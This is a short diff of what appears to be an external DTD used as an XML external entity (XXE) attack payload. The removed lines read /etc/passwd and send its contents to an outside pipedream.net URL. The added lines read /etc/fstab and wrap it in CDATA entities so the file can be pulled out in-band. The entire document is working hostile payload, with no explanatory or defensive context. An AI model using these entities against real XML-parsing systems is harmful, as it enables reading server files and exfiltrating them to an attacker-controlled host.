@@ -1,2 +1,5 @@
-<!ENTITY %xxe SYSTEM "file:///etc/passwd">
-<!ENTITY %c "<!ENTITY rrr SYSTEM 'https://end7l0yp0boy.x.pipedream.net/?a=%xxe;'>">
+<!ENTITY % file SYSTEM "file:///etc/fstab">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY fileContents 
+'%start;%file;%end;'>">
